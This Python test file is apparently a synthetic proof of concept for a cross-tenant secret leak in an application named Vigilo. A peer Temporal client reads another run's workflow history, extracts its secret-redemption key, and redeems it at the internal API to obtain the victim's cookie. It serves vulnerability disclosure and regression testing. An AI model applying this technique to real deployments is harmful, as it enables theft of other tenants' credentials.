"""End-to-end synthetic proof for Temporal-history secret disclosure.

Two live Vigilo RunSecret records are created in the test database. Their
redemption references are written into Temporal workflow inputs. A second
Temporal client (standing in for an agent subprocess on the worker network)
reads the victim workflow history and uses the recovered key against the
real internal redemption ASGI endpoint. No production credentials or service
are used.
"""
from __future__ import annotations

import uuid

import pytest
from httpx import ASGITransport, AsyncClient
from temporalio import workflow
from temporalio.client import Client
from temporalio.testing import WorkflowEnvironment
from temporalio.worker import Worker

from src.ai.envguard import strip_secret_env
from src.webapi import secret_store
from src.webapi.db import get_async_session
from src.webapi.internal import create_internal_app
from src.webapi.models import Job, Repository, Run, User, RUN_RUNNING


@workflow.defn(name="VigiloSyntheticSecretWorkflow")
class VigiloSyntheticSecretWorkflow:
    @workflow.run
    async def run(self, payload: dict) -> str:
        return "completed"


async def _new_run(session_maker) -> uuid.UUID:
    async with session_maker() as session:
        user = User(
            id=uuid.uuid4(), email=f"{uuid.uuid4().hex}@example.test",
            hashed_password="not-a-real-password", role="user",
            is_active=True, is_superuser=False, is_verified=True,
        )
        session.add(user)
        await session.flush()
        repo = Repository(created_by=user.id, name="synthetic-repo", source_type="upload")
        session.add(repo)
        await session.flush()
        job = Job(created_by=user.id, repository_id=repo.id, name="synthetic-job",
                  stage_preset="vuln")
        session.add(job)
        await session.flush()
        run = Run(job_id=job.id, status=RUN_RUNNING, session_id=str(uuid.uuid4()),
                  data_dir="/tmp/vigilo-synthetic-test")
        session.add(run)
        await session.commit()
        return run.id


@pytest.mark.asyncio
async def test_agent_peer_can_redeem_other_tenant_secret_from_temporal_history(
    session_maker,
):
    """A worker-network peer reads another run's history and redeems its secret."""
    secret_store.reset_rate_limits()
    attacker_run = await _new_run(session_maker)
    victim_run = await _new_run(session_maker)

    async with session_maker() as session:
        attacker_key = await secret_store.issue(
            session, attacker_run, {"cookie_header": "SYNTHETIC_ATTACKER_COOKIE"}
        )
    async with session_maker() as session:
        victim_key = await secret_store.issue(
            session, victim_run, {"cookie_header": "SYNTHETIC_VICTIM_COOKIE_DO_NOT_USE"}
        )

    # This is the environment passed through to agent subprocesses in deployment.
    agent_env = strip_secret_env({"TEMPORAL_ADDRESS": "temporal:7233",
                                  "VIGILO_INTERNAL_API_URL": "http://api:8081"})
    assert agent_env == {"TEMPORAL_ADDRESS": "temporal:7233"}

    async with await WorkflowEnvironment.start_local() as env:
        async with Worker(
            env.client,
            task_queue="vigilo-cross-tenant-secret-test",
            workflows=[VigiloSyntheticSecretWorkflow],
        ):
            for run_id, key in ((attacker_run, attacker_key), (victim_run, victim_key)):
                await env.client.start_workflow(
                    VigiloSyntheticSecretWorkflow.run,
                    {"run_id": str(run_id), "secrets": {"ref": str(run_id), "key": key}},
                    id=str(run_id),
                    task_queue="vigilo-cross-tenant-secret-test",
                )

            # A separate client has no Vigilo JWT or run-specific key.
            peer = await Client.connect(env.client.service_client.config.target_host)
            victim_handle = peer.get_workflow_handle(str(victim_run))
            history = await victim_handle.fetch_history()
            started = next(
                event for event in history.events
                if event.HasField("workflow_execution_started_event_attributes")
            )
            payload_bytes = b"".join(
                item.data
                for item in started.workflow_execution_started_event_attributes.input.payloads
            )
            assert victim_key.encode() in payload_bytes
            assert attacker_key.encode() not in payload_bytes

            # Use the recovered key against Vigilo's actual internal redemption route.
            async def override_session():
                async with session_maker() as session:
                    yield session

            app = create_internal_app()
            app.dependency_overrides[get_async_session] = override_session
            async with AsyncClient(
                transport=ASGITransport(app=app), base_url="http://internal"
            ) as internal:
                response = await internal.post(
                    f"/internal/v1/runs/{victim_run}/secrets",
                    json={"key": victim_key, "want": ["cookie_header"]},
                )
            assert response.status_code == 200, response.text
            assert response.json() == {
                "secrets": {"cookie_header": "SYNTHETIC_VICTIM_COOKIE_DO_NOT_USE"}
            }
